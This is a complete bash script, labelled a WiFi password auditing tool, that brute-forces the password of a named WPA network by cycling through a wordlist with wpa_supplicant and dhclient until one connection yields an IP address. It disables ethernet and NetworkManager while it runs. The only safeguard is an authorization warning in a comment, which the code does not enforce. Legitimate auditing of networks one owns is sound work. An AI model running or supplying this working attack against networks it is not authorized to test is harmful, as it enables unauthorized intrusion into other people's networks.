#!/bin/bash

# WiFi Password Auditing Tool - wpa_supplicant version
# WARNING: Only use on networks you own or have explicit authorization to test
# Usage: sudo ./wifi-bruteforce-wpa.sh <SSID> <WORDLIST_FILE>

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    killall wpa_supplicant dhclient 2>/dev/null
    if [ -n "$ETHERNET_INTERFACE" ]; then
        nmcli device connect "$ETHERNET_INTERFACE" 2>/dev/null
    fi
    rm -f /tmp/wpa_conf_* /tmp/dhclient_* 2>/dev/null
    systemctl restart NetworkManager 2>/dev/null
    echo -e "${GREEN}Cleanup complete${NC}"
    exit 0
}

trap cleanup SIGINT SIGTERM

# Check requirements
if [ "$EUID" -ne 0 ]; then 
    echo "Must run with sudo"
    exit 1
fi

if [ $# -lt 2 ]; then
    echo "Usage: sudo ./wifi-bruteforce-wpa.sh <SSID> <WORDLIST>"
    exit 1
fi

SSID="$1"
WORDLIST="$2"

# Get interfaces
WIFI_INTERFACE=$(nmcli device status | awk '/wifi/ {print $1}' | head -1)
ETHERNET_INTERFACE=$(nmcli device status | awk '/ethernet/ {print $1}' | head -1)

echo -e "${YELLOW}================================${NC}"
echo -e "Target SSID: ${BLUE}$SSID${NC}"
echo -e "Interface: ${BLUE}$WIFI_INTERFACE${NC}"
echo -e "Wordlist: ${BLUE}$WORDLIST${NC}"
echo -e "${YELLOW}================================${NC}"

# Disable ethernet
if [ -n "$ETHERNET_INTERFACE" ]; then
    ip link set "$ETHERNET_INTERFACE" down
fi

# Stop NetworkManager from interfering
systemctl stop NetworkManager
sleep 2

# Count passwords
TOTAL=$(wc -l < "$WORDLIST")
ATTEMPT=0
FOUND=false

# Main loop
while IFS= read -r PASSWORD || [ -n "$PASSWORD" ]; do
    PASSWORD=$(echo "$PASSWORD" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    [ -z "$PASSWORD" ] && continue
    
    ATTEMPT=$((ATTEMPT + 1))
    echo -ne "${BLUE}[${ATTEMPT}/${TOTAL}]${NC} Trying: ${YELLOW}${PASSWORD}${NC}\r"
    
    # Create wpa_supplicant config
    WPA_CONF="/tmp/wpa_conf_$$"
    wpa_passphrase "$SSID" "$PASSWORD" > "$WPA_CONF" 2>/dev/null
    
    # Kill old processes
    killall wpa_supplicant dhclient 2>/dev/null
    sleep 1
    
    # Start wpa_supplicant
    wpa_supplicant -B -i "$WIFI_INTERFACE" -c "$WPA_CONF" 2>/dev/null
    sleep 3
    
    # Check if we associated
    ASSOCIATED=$(iwconfig "$WIFI_INTERFACE" 2>/dev/null | grep -o "ESSID:\"$SSID\"")
    
    if [ -n "$ASSOCIATED" ]; then
        # Try to get IP via dhclient
        dhclient -1 "$WIFI_INTERFACE" &
        DHCP_PID=$!
        sleep 5
        
        # Check for IP address
        IP_ADDR=$(ip -4 addr show "$WIFI_INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
        
        if [ -n "$IP_ADDR" ]; then
            echo -e "\n${GREEN}SUCCESS! Password: $PASSWORD${NC}"
            echo -e "IP Address: $IP_ADDR"
            FOUND=true
            break
        fi
        
        kill $DHCP_PID 2>/dev/null
    fi
    
    # Cleanup
    killall wpa_supplicant 2>/dev/null
    rm -f "$WPA_CONF"
    
done < "$WORDLIST"

# Restore network
echo -e "\n${YELLOW}Restoring network...${NC}"
killall wpa_supplicant dhclient 2>/dev/null
systemctl start NetworkManager
sleep 3

if [ -n "$ETHERNET_INTERFACE" ]; then
    ip link set "$ETHERNET_INTERFACE" up
fi

if [ "$FOUND" = true ]; then
    echo -e "${GREEN}Password found: $PASSWORD${NC}"
else
    echo -e "${RED}Password not found in wordlist${NC}"
fi

rm -f /tmp/wpa_conf_* 2>/dev/null
trap - SIGINT SIGTERM
